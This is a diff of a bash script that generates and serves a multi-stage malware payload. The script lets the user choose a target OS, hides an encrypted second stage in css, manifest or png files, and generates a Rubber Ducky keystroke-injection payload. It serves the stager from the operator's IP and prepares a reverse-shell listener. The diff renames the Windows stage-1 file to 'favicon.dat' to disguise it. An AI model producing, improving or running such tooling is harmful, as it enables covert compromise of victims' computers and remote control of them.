@@ -34,7 +34,6 @@ STAGERS_DIR="stagers"
 mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"
 
 log "Available local IPv4 addresses:"
-
 mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
 for i in "${!ip_list[@]}"; do
     echo "  [$i] ${ip_list[$i]}"
@@ -75,7 +74,7 @@ free_port() {
 free_port "$PORT_SHELL"
 free_port "$PORT_SERVE"
 
-# -------------[ ОС ВЫБОР ]----------
+# -------------[ OS Selection ]----------
 log "Choose target OS:"
 select OS in linux windows mac; do [[ -n "$OS" ]]; break; done
 
@@ -89,7 +88,7 @@ select PAYLOAD in "${PAYLOADS[@]}"; do [[ -n "$PAYLOAD" ]]; break; done
 log "Choose delivery method:"
 select DELIVERY in css manifest png; do [[ -n "$DELIVERY" ]]; break; done
 
-# ------------[ ОС СПЕЦИФИКА: переменные ]-------------------
+# ------------[ OS-specific paths ]-------------------
 if [[ "$OS" == "linux" ]]; then
   STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.sh"
   STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.sh"
@@ -98,8 +97,8 @@ if [[ "$OS" == "linux" ]]; then
 elif [[ "$OS" == "windows" ]]; then
   STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.ps1"
   STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.ps1"
-  FINAL_STAGE1="$OUTPUT_DIR/final_stage1.ps1"
-  FINAL_STAGE1_WEB="final_stage1.ps1"
+  FINAL_STAGE1="$OUTPUT_DIR/favicon.dat"
+  FINAL_STAGE1_WEB="favicon.dat"
 elif [[ "$OS" == "mac" ]]; then
   error "Mac OS is not supported yet."
   exit 2
@@ -107,7 +106,6 @@ else
   error "Unknown OS: $OS"
   exit 2
 fi
-
 
 [[ -f "$STAGE2_RAW" ]] || { error "No raw payload $STAGE2_RAW"; exit 1; }
 [[ -f "$STAGER_FILE" ]] || { error "No stager template $STAGER_FILE"; exit 1; }
@@ -144,10 +142,22 @@ STAGER_CONTENT=$(sed \
   -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
   -e "s|REPLACE_URL|$DELIVERY_URL|g" \
   -e "s|REPLACE_KEY|$KEY_HEX_ESCAPED|g" \
+  -e "s|REPLACE_AES|$ENCODED|g" \
   "$STAGER_FILE")
 
 echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
 cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"
+
+# Копируем encrypted_stage2 в web если windows
+# Windows: favicon.dat (Stage 1) уже ссылается на delivery payload
+if [[ "$OS" == "windows" ]]; then
+  case "$DELIVERY" in
+    css)      echo "[+] Embedded payload in style.css";;
+    manifest) echo "[+] Embedded payload in manifest.json";;
+    png)      echo "[+] Embedded payload in favicon.png";;
+  esac
+fi
+
 
 log "Generating Ducky payload..."
 python3 tools/generate_ducky.py "$IP" "$PORT_SERVE" 1000 "$OUTPUT_DIR/ducky_payload.txt" "$OS"
@@ -188,7 +198,7 @@ EOF
 log "Payload is ready and being served in background."
 log "----------------------------------------------------"
 log "  Serve URL:          http://$IP:$PORT_SERVE/"
-log "  Direct download:    http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
+log "  Direct download:    http://$IP:$PORT_SERVE/favicon.dat"
 log "  Ducky payload:      $OUTPUT_DIR/ducky_payload.txt"
 log "----------------------------------------------------"
 log "To listen for an incoming connection, run:"
